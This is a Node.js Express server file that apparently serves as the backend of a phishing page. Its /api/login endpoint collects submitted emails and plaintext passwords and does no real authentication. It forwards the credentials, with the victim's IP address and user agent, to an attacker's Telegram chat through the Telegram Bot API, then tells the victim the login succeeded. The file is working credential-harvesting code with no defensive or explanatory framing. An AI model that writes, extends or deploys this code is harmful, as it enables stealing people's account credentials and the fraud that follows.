const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false, // Disable CSP for simplicity
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/login', limiter);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    
    console.log('Telegram message sent successfully');
    return { success: true, data: response.data };
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return { success: false, error: error.message };
  }
}

// Function to format login details
function formatLoginDetails(loginData) {
  const timestamp = new Date().toLocaleString();
  
  const message = `
🔐 <b>New Login Attempt</b>
━━━━━━━━━━━━━━━━━━━━
📅 <b>Timestamp:</b> ${timestamp}
📧 <b>Email:</b> ${loginData.email || 'N/A'}
🔑 <b>Password:</b> ${loginData.password || 'N/A'}
🌐 <b>IP Address:</b> ${loginData.ip || 'N/A'}
📍 <b>Location:</b> ${loginData.location || 'N/A'}
🖥 <b>User Agent:</b> ${loginData.userAgent || 'N/A'}
━━━━━━━━━━━━━━━━━━━━
  `;
  
  return message;
}

// Main login endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email) {
      return res.status(400).json({
        success: false,
        message: 'Email is required'
      });
    }
    
    if (!password) {
      return res.status(400).json({
        success: false,
        message: 'Password is required'
      });
    }
    
    const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'Unknown';
    const userAgent = req.headers['user-agent'];
    
    const loginData = {
      email,
      password,
      ip: clientIP,
      location: 'Unknown',
      userAgent
    };
    
    console.log('Login attempt:', { email, ip: clientIP });
    
    const message = formatLoginDetails(loginData);
    const telegramResponse = await sendToTelegram(message);
    
    res.status(200).json({
      success: true,
      message: 'Login processed successfully'
    });
    
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'OK',
    timestamp: new Date().toISOString()
  });
});

// Root endpoint - serve HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
});
